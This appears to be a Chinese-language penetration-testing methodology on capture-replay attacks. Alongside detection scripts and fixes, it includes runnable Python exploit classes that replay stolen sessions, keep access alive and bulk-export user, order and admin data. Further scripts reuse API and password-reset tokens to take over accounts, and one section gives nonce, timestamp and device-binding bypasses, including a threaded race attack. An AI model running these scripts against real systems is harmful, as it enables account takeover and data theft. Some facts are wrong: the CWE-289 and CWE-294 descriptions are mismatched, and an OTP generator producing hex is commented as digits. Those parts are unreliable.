# 捕获重放攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的捕获重放攻击（Capture-Replay Attack）检测和利用流程。捕获重放攻击是指攻击者截获有效的认证数据（如令牌、凭证、请求），然后在稍后时间重放这些数据以获得未授权访问。

## 1.2 适用范围

本文档适用于所有存在认证机制的系统，包括：
- Web 应用认证
- API 令牌认证
- 移动应用认证
- 硬件令牌认证
- 多因素认证系统
- 会话管理系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

捕获重放攻击（Capture-Replay Attack）是指攻击者通过以下方式进行攻击：
1. **捕获**：截获有效的认证数据（令牌、Cookie、请求等）
2. **存储**：保存捕获的数据
3. **重放**：在稍后时间重放这些数据
4. **利用**：获得未授权访问

**本质问题**：
- 认证令牌可重用（无一次性机制）
- 令牌无有效期或有效期过长
- 请求无时间戳验证
- 请求无随机数（nonce）验证
- 会话无失效机制

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-289 | 通过捕获 - 重放绕过认证 (Authentication Bypass by Capture-replay) |
| CWE-294 | 多因素认证中的可重放认证因子 (Authentication Bypass by Capture-replay in MFA) |
| CWE-613 | 会话过期不足 (Insufficient Session Expiration) |
| CWE-640 | 弱密码恢复机制 (Weak Password Recovery Mechanism) |
| CWE-308 | 使用单因素认证 (Use of Single-factor Authentication) |

### 重放攻击类型

| 类型 | 描述 | 风险等级 |
|-----|------|---------|
| 会话令牌重放 | 重放有效的会话 Cookie/Token | 高 |
| API 令牌重放 | 重放 API 访问令牌 | 高 |
| 认证请求重放 | 重放完整的认证请求 | 中 - 高 |
| OTP 重放 | 重放一次性密码 | 高 |
| 签名请求重放 | 重放签名的 API 请求 | 中 |
| 密码重置令牌重放 | 重用密码重置链接 | 高 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| API 认证 | Bearer Token 认证 | 令牌无有效期或可重用 |
| 会话管理 | Cookie 会话 | 登出后会话未失效 |
| 多因素认证 | OTP 验证码 | 验证码可重复使用 |
| 密码重置 | 重置令牌 | 令牌使用后可重用 |
| OAuth 流程 | 授权码/访问令牌 | 令牌可重放 |
| 硬件令牌 | TOTP/HOTP | HOTP 计数器不同步可重放 |
| 移动应用 | 设备令牌 | 令牌长期有效 |
| SSO 系统 | SAML 断言 | 断言可重放 |

### 常见代码缺陷

```python
# ❌ 危险模式：令牌无有效期
def generate_token(user_id):
    return hashlib.md5(str(user_id).encode()).hexdigest()
# 无时间戳，令牌永久有效

# ❌ 危险模式：OTP 可重用
def verify_otp(user_id, otp):
    stored_otp = get_stored_otp(user_id)
    if otp == stored_otp:
        return True  # 未标记为已使用
    return False

# ❌ 危险模式：请求无时间戳验证
def verify_request_signature(request):
    signature = request.headers.get('X-Signature')
    if verify_signature(signature):
        return True  # 未检查时间戳
    return False

# ✅ 正确模式：令牌有时效性
def generate_token(user_id):
    import time
    expiry = int(time.time()) + 3600  # 1 小时有效期
    data = f"{user_id}:{expiry}"
    signature = hmac.new(SECRET, data.encode(), hashlib.sha256).hexdigest()
    return f"{data}:{signature}"

# ✅ 正确模式：OTP 一次性使用
def verify_otp(user_id, otp):
    stored_otp = get_stored_otp(user_id)
    if otp == stored_otp:
        mark_otp_as_used(user_id)  # 标记为已使用
        return True
    return False

# ✅ 正确模式：请求时间戳验证
def verify_request_signature(request):
    timestamp = int(request.headers.get('X-Timestamp', 0))
    current_time = int(time.time())
    
    # 检查时间戳是否在允许窗口内（如 5 分钟）
    if abs(current_time - timestamp) > 300:
        return False  # 请求过期
    
    # 检查 nonce 是否已使用
    nonce = request.headers.get('X-Nonce')
    if nonce_used(nonce):
        return False  # 重放攻击
    
    signature = request.headers.get('X-Signature')
    if verify_signature(signature):
        mark_nonce_used(nonce)  # 标记 nonce 为已使用
        return True
    return False
```

## 2.3 漏洞发现方法

### 2.3.1 黑盒检测方法

**会话令牌重放检测**：

```bash
# 步骤 1：登录获取会话
curl -c cookies.txt -X POST https://target.com/login \
    -d "username=test&password=test"

# 步骤 2：验证会话有效
curl -b cookies.txt https://target.com/dashboard

# 步骤 3：登出
curl -b cookies.txt -X POST https://target.com/logout

# 步骤 4：重放会话（登出后）
curl -b cookies.txt https://target.com/dashboard
# 如果仍能访问，存在重放漏洞

# 步骤 5：在不同时间重放
sleep 3600  # 等待 1 小时
curl -b cookies.txt https://target.com/dashboard
# 如果仍能访问，会话无过期或过期时间长
```

**API 令牌重放检测**：

```bash
# 步骤 1：获取 API 令牌
TOKEN=$(curl -X POST https://target.com/api/token \
    -d "username=test&password=test" | jq -r '.access_token')

# 步骤 2：使用令牌访问 API
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/user

# 步骤 3：在不同时间重放令牌
sleep 300
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/user
# 如果仍能访问，令牌有效期长或无过期

# 步骤 4：在另一台设备/地点重放
# 使用相同的令牌从不同 IP 访问
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/user
# 如果无设备绑定，可重放
```

**OTP 重放检测**：

```bash
# 步骤 1：请求 OTP
curl -X POST https://target.com/send-otp \
    -d "phone=1234567890"

# 步骤 2：获取 OTP（假设通过某种方式）
OTP="123456"

# 步骤 3：使用 OTP 验证
curl -X POST https://target.com/verify-otp \
    -d "phone=1234567890&otp=$OTP"

# 步骤 4：重放 OTP
curl -X POST https://target.com/verify-otp \
    -d "phone=1234567890&otp=$OTP"
# 如果验证成功，OTP 可重用
```

**自动化重放漏洞检测脚本**：

```python
#!/usr/bin/env python3
"""
重放攻击漏洞检测脚本
检测会话令牌、API 令牌、OTP 等的重放漏洞
"""

import requests
import time

class ReplayAttackDetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
    
    def test_session_replay(self, login_data):
        """测试会话重放"""
        print("[*] Testing session replay...")
        
        # 登录
        login_response = self.session.post(
            f"{self.base_url}/login",
            data=login_data
        )
        
        if login_response.status_code not in [200, 302]:
            print("[-] Login failed")
            return
        
        # 保存会话 Cookie
        original_cookies = dict(self.session.cookies)
        
        # 验证登录状态
        response = self.session.get(f"{self.base_url}/dashboard")
        if response.status_code != 200:
            print("[-] Dashboard access failed")
            return
        
        print("[+] Logged in successfully")
        
        # 登出
        self.session.post(f"{self.base_url}/logout")
        print("[*] Logged out")
        
        # 创建新会话并重放 Cookie
        new_session = requests.Session()
        new_session.cookies.update(original_cookies)
        
        # 尝试访问受保护资源
        response = new_session.get(f"{self.base_url}/dashboard")
        
        if response.status_code == 200:
            if 'logged in' in response.text.lower() or \
               'dashboard' in response.text.lower() or \
               'welcome' in response.text.lower():
                self.findings.append({
                    'type': 'SESSION_REPLAY',
                    'severity': 'HIGH',
                    'description': 'Session token is valid after logout'
                })
                print("[VULNERABLE] Session replay successful after logout!")
            else:
                print("[SAFE] Session invalidated after logout")
        else:
            print("[SAFE] Session invalidated after logout")
    
    def test_token_expiry(self, token_data):
        """测试令牌有效期"""
        print("[*] Testing token expiry...")
        
        # 获取令牌
        response = requests.post(
            f"{self.base_url}/api/token",
            data=token_data
        )
        
        if response.status_code != 200:
            print("[-] Failed to get token")
            return
        
        token = response.json().get('access_token')
        if not token:
            print("[-] No token in response")
            return
        
        print("[+] Token obtained")
        
        # 立即测试令牌
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get(
            f"{self.base_url}/api/user",
            headers=headers
        )
        
        if response.status_code != 200:
            print("[-] Token not working immediately")
            return
        
        print("[+] Token works immediately")
        
        # 在不同时间间隔测试
        intervals = [60, 300, 900, 1800, 3600]  # 秒
        
        for interval in intervals:
            print(f"[*] Waiting {interval} seconds...")
            time.sleep(interval)
            
            response = requests.get(
                f"{self.base_url}/api/user",
                headers=headers
            )
            
            if response.status_code == 200:
                print(f"[+] Token still valid after {interval} seconds")
            else:
                print(f"[-] Token expired after {interval} seconds")
                self.findings.append({
                    'type': 'TOKEN_EXPIRY',
                    'severity': 'INFO',
                    'description': f'Token expires after approximately {interval} seconds'
                })
                break
        else:
            self.findings.append({
                'type': 'LONG_TOKEN_VALIDITY',
                'severity': 'MEDIUM',
                'description': 'Token valid for more than 1 hour'
            })
            print("[WARNING] Token valid for extended period!")
    
    def test_otp_replay(self, otp_data):
        """测试 OTP 重放"""
        print("[*] Testing OTP replay...")
        
        phone = otp_data.get('phone', '1234567890')
        otp = otp_data.get('otp', '123456')
        
        # 第一次验证
        response1 = requests.post(
            f"{self.base_url}/verify-otp",
            data={'phone': phone, 'otp': otp}
        )
        
        if response1.status_code != 200:
            print("[-] First OTP verification failed")
            return
        
        print("[+] First OTP verification successful")
        
        # 重放 OTP
        response2 = requests.post(
            f"{self.base_url}/verify-otp",
            data={'phone': phone, 'otp': otp}
        )
        
        if response2.status_code == 200:
            if 'success' in response2.text.lower():
                self.findings.append({
                    'type': 'OTP_REPLAY',
                    'severity': 'HIGH',
                    'description': 'OTP can be reused'
                })
                print("[VULNERABLE] OTP replay successful!")
            else:
                print("[SAFE] OTP rejected on replay")
        else:
            print("[SAFE] OTP rejected on replay")
    
    def test_request_replay(self, request_data):
        """测试请求重放"""
        print("[*] Testing request replay...")
        
        url = request_data.get('url')
        method = request_data.get('method', 'POST')
        data = request_data.get('data', {})
        headers = request_data.get('headers', {})
        
        # 发送原始请求
        response1 = requests.request(
            method=method,
            url=url,
            data=data,
            headers=headers
        )
        
        if response1.status_code != 200:
            print("[-] Original request failed")
            return
        
        print("[+] Original request successful")
        
        # 重放请求
        response2 = requests.request(
            method=method,
            url=url,
            data=data,
            headers=headers
        )
        
        if response2.status_code == response1.status_code:
            # 检查是否是敏感操作
            sensitive_indicators = ['transfer', 'withdraw', 'purchase', 'order']
            if any(ind in url.lower() for ind in sensitive_indicators):
                self.findings.append({
                    'type': 'REQUEST_REPLAY',
                    'severity': 'HIGH',
                    'description': f'Sensitive request can be replayed: {url}'
                })
                print(f"[VULNERABLE] Request replay successful for sensitive operation!")
    
    def generate_report(self):
        """生成检测报告"""
        print("\n" + "="*60)
        print("Replay Attack Vulnerability Report")
        print("="*60)
        
        if not self.findings:
            print("[PASS] No replay vulnerabilities found")
        else:
            print(f"[FAIL] Found {len(self.findings)} vulnerability(ies):\n")
            for finding in self.findings:
                print(f"Type: {finding['type']}")
                print(f"Severity: {finding['severity']}")
                print(f"Description: {finding['description']}")
                print("-" * 40)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        detector = ReplayAttackDetector(sys.argv[1])
        
        # 测试会话重放
        detector.test_session_replay({
            'username': 'test',
            'password': 'test123'
        })
        
        # 测试令牌有效期
        detector.test_token_expiry({
            'username': 'test',
            'password': 'test123'
        })
        
        # 生成报告
        detector.generate_report()
    else:
        print("Usage: python replay_detector.py <base_url>")
```

### 2.3.2 白盒检测方法

**代码审计要点**：

```python
# 搜索令牌生成代码
grep -r "generate.*token" .
grep -r "create.*session" .

# 搜索令牌验证代码
grep -r "verify.*token" .
grep -r "validate.*session" .

# 搜索 OTP 验证代码
grep -r "verify.*otp" .
grep -r "verify.*code" .

# 检查时间戳验证
grep -r "timestamp" .
grep -r "time.*window" .

# 检查 nonce 实现
grep -r "nonce" .
grep -r "random.*token" .
```

**数据库模式检查**：

```sql
-- 检查会话表结构
DESCRIBE sessions;
-- 查找 expiry、created_at 字段

-- 检查 OTP 表结构
DESCRIBE otp_codes;
-- 查找 used、expires_at 字段

-- 检查已使用令牌表
SHOW TABLES LIKE '%used%token%';
SHOW TABLES LIKE '%nonce%';
```

## 2.4 漏洞利用方法

### 2.4.1 会话令牌重放利用

```python
#!/usr/bin/env python3
"""
会话令牌重放利用脚本
"""

import requests
import json

class SessionReplayExploiter:
    def __init__(self, target_url, credentials):
        self.target_url = target_url
        self.credentials = credentials
        self.captured_sessions = []
    
    def capture_session(self):
        """捕获有效会话"""
        session = requests.Session()
        
        # 登录
        response = session.post(
            f"{self.target_url}/login",
            data=self.credentials
        )
        
        if response.status_code in [200, 302]:
            # 保存会话 Cookie
            cookies = dict(session.cookies)
            self.captured_sessions.append(cookies)
            print(f"[+] Session captured")
            return cookies
        else:
            print("[-] Login failed")
            return None
    
    def replay_session(self, cookies, endpoints=None):
        """重放会话"""
        if endpoints is None:
            endpoints = [
                '/dashboard',
                '/profile',
                '/api/user',
                '/api/orders',
                '/api/payments'
            ]
        
        session = requests.Session()
        session.cookies.update(cookies)
        
        results = {}
        
        for endpoint in endpoints:
            try:
                response = session.get(f"{self.target_url}{endpoint}")
                
                if response.status_code == 200:
                    results[endpoint] = {
                        'status': 'success',
                        'length': len(response.text)
                    }
                    print(f"[+] {endpoint}: Access granted")
                else:
                    results[endpoint] = {
                        'status': 'failed',
                        'code': response.status_code
                    }
            except Exception as e:
                results[endpoint] = {
                    'status': 'error',
                    'error': str(e)
                }
        
        return results
    
    def persistent_access(self, cookies):
        """建立持久访问"""
        # 定期发送请求保持会话活跃
        session = requests.Session()
        session.cookies.update(cookies)
        
        import time
        while True:
            try:
                response = session.get(f"{self.target_url}/dashboard")
                if response.status_code == 200:
                    print(f"[+] Session still valid at {time.strftime('%H:%M:%S')}")
                else:
                    print("[-] Session expired")
                    break
            except:
                break
            
            # 每 5 分钟发送一次请求
            time.sleep(300)
    
    def export_data(self, cookies):
        """导出数据"""
        session = requests.Session()
        session.cookies.update(cookies)
        
        export_endpoints = [
            '/api/users/export',
            '/api/orders/export',
            '/api/data/export',
            '/admin/export'
        ]
        
        for endpoint in export_endpoints:
            try:
                response = session.get(f"{self.target_url}{endpoint}")
                if response.status_code == 200:
                    filename = f"export_{endpoint.replace('/', '_')}.txt"
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    print(f"[+] Exported: {endpoint}")
            except:
                pass

if __name__ == '__main__':
    exploiter = SessionReplayExploiter(
        'https://target.com',
        {'username': 'victim', 'password': 'password123'}
    )
    
    # 捕获会话
    cookies = exploiter.capture_session()
    
    if cookies:
        # 重放会话
        exploiter.replay_session(cookies)
        
        # 导出数据
        exploiter.export_data(cookies)
```

### 2.4.2 API 令牌重放利用

```python
#!/usr/bin/env python3
"""
API 令牌重放利用脚本
"""

import requests
import base64
import json

class APITokenReplayExploiter:
    def __init__(self, api_base, credentials):
        self.api_base = api_base
        self.credentials = credentials
        self.token = None
    
    def get_token(self):
        """获取 API 令牌"""
        response = requests.post(
            f"{self.api_base}/auth/token",
            data=self.credentials
        )
        
        if response.status_code == 200:
            data = response.json()
            self.token = data.get('access_token')
            print(f"[+] Token obtained: {self.token[:30]}...")
            return self.token
        else:
            print("[-] Failed to get token")
            return None
    
    def decode_jwt(self, token):
        """解码 JWT 令牌"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            return {
                'header': header,
                'payload': payload
            }
        except:
            return None
    
    def analyze_token(self):
        """分析令牌"""
        if not self.token:
            return
        
        print("[*] Analyzing token...")
        
        decoded = self.decode_jwt(self.token)
        if decoded:
            print(f"  Header: {json.dumps(decoded['header'], indent=2)}")
            print(f"  Payload: {json.dumps(decoded['payload'], indent=2)}")
            
            # 检查有效期
            if 'exp' in decoded['payload']:
                import datetime
                exp_time = datetime.datetime.fromtimestamp(decoded['payload']['exp'])
                print(f"  Expires: {exp_time}")
            
            # 检查是否有刷新令牌
            if 'refresh_token' in decoded['payload']:
                print("  [!] Refresh token embedded in access token")
    
    def replay_token(self, endpoints=None):
        """重放令牌"""
        if endpoints is None:
            endpoints = [
                '/api/v1/user',
                '/api/v1/orders',
                '/api/v1/payments',
                '/api/v1/admin/users'
            ]
        
        headers = {'Authorization': f'Bearer {self.token}'}
        
        for endpoint in endpoints:
            try:
                response = requests.get(
                    f"{self.api_base}{endpoint}",
                    headers=headers
                )
                
                if response.status_code == 200:
                    print(f"[+] {endpoint}: Access granted")
                    
                    # 保存响应
                    with open(f"api_response_{endpoint.replace('/', '_')}.json", 'w') as f:
                        json.dump(response.json(), f, indent=2)
                else:
                    print(f"[-] {endpoint}: {response.status_code}")
            except Exception as e:
                print(f"[-] {endpoint}: Error - {e}")
    
    def token_refresh_attack(self):
        """令牌刷新攻击"""
        # 如果令牌包含刷新令牌
        decoded = self.decode_jwt(self.token)
        if decoded and 'refresh_token' in decoded['payload']:
            refresh_token = decoded['payload']['refresh_token']
            
            # 使用刷新令牌获取新访问令牌
            response = requests.post(
                f"{self.api_base}/auth/refresh",
                data={'refresh_token': refresh_token}
            )
            
            if response.status_code == 200:
                new_token = response.json().get('access_token')
                print(f"[+] New token obtained via refresh: {new_token[:30]}...")
                return new_token
        
        return None

if __name__ == '__main__':
    exploiter = APITokenReplayExploiter(
        'https://api.target.com',
        {'username': 'victim', 'password': 'password123'}
    )
    
    # 获取令牌
    token = exploiter.get_token()
    
    if token:
        # 分析令牌
        exploiter.analyze_token()
        
        # 重放令牌
        exploiter.replay_token()
        
        # 尝试刷新攻击
        exploiter.token_refresh_attack()
```

### 2.4.3 密码重置令牌重放

```python
#!/usr/bin/env python3
"""
密码重置令牌重放利用
"""

import requests
import re

class PasswordResetReplayExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.reset_tokens = []
    
    def request_reset(self, email):
        """请求密码重置"""
        response = requests.post(
            f"{self.target_url}/forgot-password",
            data={'email': email}
        )
        
        if response.status_code == 200:
            print(f"[+] Password reset requested for {email}")
            return True
        else:
            print("[-] Failed to request password reset")
            return False
    
    def capture_token(self, email_access):
        """从邮箱捕获重置令牌"""
        # 这需要访问受害者的邮箱
        # 实际攻击中可能通过以下方式：
        # 1. 邮箱凭证已泄露
        # 2. 邮箱会话被劫持
        # 3. 邮件服务器被入侵
        
        # 示例：从邮件内容提取令牌
        email_content = email_access.get_latest_email()
        
        # 提取重置链接
        reset_link_pattern = r'https?://\S+/reset-password\?token=([a-zA-Z0-9]+)'
        match = re.search(reset_link_pattern, email_content)
        
        if match:
            token = match.group(1)
            self.reset_tokens.append(token)
            print(f"[+] Reset token captured: {token}")
            return token
        else:
            print("[-] Failed to capture reset token")
            return None
    
    def replay_token(self, email, token, new_password):
        """重放重置令牌"""
        response = requests.post(
            f"{self.target_url}/reset-password",
            data={
                'email': email,
                'token': token,
                'new_password': new_password
            }
        )
        
        if response.status_code == 200:
            if 'success' in response.text.lower():
                print(f"[SUCCESS] Password reset successful with replayed token!")
                return True
        
        print("[-] Password reset failed")
        return False
    
    def test_token_reuse(self, email, token):
        """测试令牌可重用性"""
        # 第一次使用
        result1 = self.replay_token(email, token, 'NewPass123!')
        
        # 第二次使用（重放）
        result2 = self.replay_token(email, token, 'NewPass456!')
        
        if result1 and result2:
            print("[VULNERABLE] Reset token can be reused!")
            return True
        elif result1 and not result2:
            print("[SAFE] Reset token is single-use")
            return False
        else:
            print("[-] Test inconclusive")
            return None

if __name__ == '__main__':
    exploiter = PasswordResetReplayExploiter('https://target.com')
    
    # 请求重置
    exploiter.request_reset('victim@example.com')
    
    # 捕获令牌（需要邮箱访问）
    # token = exploiter.capture_token(email_access)
    
    # 重放令牌
    # exploiter.replay_token('victim@example.com', token, 'AttackerPass123!')
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过时间戳验证

```python
# 如果请求有时间戳验证，尝试以下方法

# 方法 1：使用当前时间戳
import time
current_timestamp = int(time.time())

headers = {
    'X-Timestamp': str(current_timestamp),
    # 其他请求头
}

# 方法 2：在时间窗口内重放
# 如果时间窗口是 5 分钟，在 5 分钟内重放请求

# 方法 3：修改系统时间（如果控制客户端）
# 将系统时间设置为原始请求的时间
```

### 2.5.2 绕过 nonce 检查

```python
# 如果请求有 nonce 检查，尝试以下方法

# 方法 1：生成新的 nonce
import uuid
new_nonce = str(uuid.uuid4())

headers = {
    'X-Nonce': new_nonce,
    # 重新计算签名
}

# 方法 2：nonce 清理攻击
# 如果 nonce 存储有大小限制或自动清理
# 发送大量请求填满 nonce 存储，使旧的 nonce 被清理

# 方法 3：数据库竞争条件
# 并发发送相同 nonce 的请求
import threading

def send_request():
    requests.post(url, headers=headers, data=data)

threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()
```

### 2.5.3 绕过设备绑定

```python
# 如果令牌与设备绑定，尝试以下方法

# 方法 1：复制设备指纹
headers = {
    'X-Device-ID': 'original_device_id',
    'User-Agent': 'original_user_agent',
    'X-App-Version': 'original_app_version'
}

# 方法 2：修改设备标识
# 在移动应用中，可以 hook 设备 ID 获取函数
# 使用 Frida 修改返回的设备 ID

# 方法 3：使用原始设备
# 如果物理访问用户设备，直接使用原设备
```

---

# 第三部分：附录

## 3.1 重放攻击检测检查清单

| 检查项 | 测试方法 | 安全要求 |
|-------|---------|---------|
| 会话重放 | 登出后重放会话 | 会话应立即失效 |
| 令牌重放 | 过期后重放令牌 | 令牌应拒绝过期令牌 |
| OTP 重放 | 重复使用 OTP | OTP 应一次性有效 |
| 请求重放 | 重放敏感操作请求 | 应有时间戳/nonce 验证 |
| 重置令牌重放 | 重复使用重置令牌 | 令牌应一次性有效 |
| 设备绑定 | 不同设备使用同一令牌 | 应检测并阻止 |

## 3.2 常用工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| Burp Suite | 请求重放 | Repeater 模块 |
| curl | 手动重放请求 | `curl -H "Authorization: Bearer $TOKEN"` |
| Postman | API 请求重放 | 保存和重放请求 |
| Frida | Hook 设备指纹 | `frida -U -f app -l hook.js` |
| Wireshark | 捕获网络流量 | 过滤认证流量 |

## 3.3 修复建议

### 会话管理修复

```python
# ✅ 会话失效机制
def logout(user_id):
    # 服务器端清除会话
    session_store.delete(user_id)
    
    # 将会话加入黑名单（用于分布式系统）
    session_blacklist.add(user_id, expiry=3600)

# ✅ 会话验证
def verify_session(session_id):
    # 检查会话是否存在
    if not session_store.exists(session_id):
        return False
    
    # 检查会话是否在黑名单中
    if session_blacklist.exists(session_id):
        return False
    
    # 检查会话过期
    if session_store.is_expired(session_id):
        session_store.delete(session_id)
        return False
    
    return True
```

### 令牌修复

```python
# ✅ JWT 令牌有时效性
import jwt
import time

def generate_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': int(time.time()) + 3600,  # 1 小时有效期
        'iat': int(time.time())
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

# ✅ 令牌验证
def verify_token(token):
    try:
        payload = jwt.decode(token, SECRET, algorithms=['HS256'])
        
        # 检查令牌是否在黑名单中
        if token_blacklist.exists(token):
            return None
        
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
```

### OTP 修复

```python
# ✅ OTP 一次性使用
import secrets
import time

def generate_otp(user_id):
    otp = secrets.token_hex(3)  # 6 位数字
    
    # 存储 OTP 及元数据
    otp_store.set(user_id, {
        'otp': otp,
        'created_at': int(time.time()),
        'used': False
    })
    
    return otp

def verify_otp(user_id, otp):
    stored = otp_store.get(user_id)
    
    if not stored:
        return False
    
    # 检查是否已使用
    if stored.get('used'):
        return False
    
    # 检查过期（5 分钟）
    if int(time.time()) - stored['created_at'] > 300:
        otp_store.delete(user_id)
        return False
    
    # 验证 OTP
    if stored['otp'] != otp:
        return False
    
    # 标记为已使用
    stored['used'] = True
    otp_store.set(user_id, stored)
    
    return True
```

### 请求签名修复

```python
# ✅ 带时间戳和 nonce 的请求签名
import hmac
import hashlib
import time
import uuid

def generate_signed_request(user_id, method, path, data):
    timestamp = int(time.time())
    nonce = str(uuid.uuid4())
    
    # 构建签名字符串
    message = f"{method}:{path}:{timestamp}:{nonce}:{data}"
    signature = hmac.new(SECRET.encode(), message.encode(), hashlib.sha256).hexdigest()
    
    return {
        'X-Timestamp': str(timestamp),
        'X-Nonce': nonce,
        'X-Signature': signature
    }

def verify_signed_request(request, user_secret):
    timestamp = int(request.headers.get('X-Timestamp', 0))
    nonce = request.headers.get('X-Nonce')
    signature = request.headers.get('X-Signature')
    
    # 检查时间戳（5 分钟窗口）
    if abs(int(time.time()) - timestamp) > 300:
        return False
    
    # 检查 nonce 是否已使用
    if nonce_store.exists(nonce):
        return False  # 重放攻击
    
    # 验证签名
    method = request.method
    path = request.path
    data = request.get_data(as_text=True)
    
    message = f"{method}:{path}:{timestamp}:{nonce}:{data}"
    expected_signature = hmac.new(user_secret.encode(), message.encode(), hashlib.sha256).hexdigest()
    
    if not hmac.compare_digest(signature, expected_signature):
        return False
    
    # 标记 nonce 为已使用
    nonce_store.set(nonce, True, expiry=3600)
    
    return True
```

## 3.4 参考资源

- [CWE-289: Authentication Bypass by Capture-replay](https://cwe.mitre.org/data/definitions/289.html)
- [CWE-294: Authentication Bypass by Capture-replay in MFA](https://cwe.mitre.org/data/definitions/294.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6749: OAuth 2.0](https://www.rfc-editor.org/rfc/rfc6749.html)
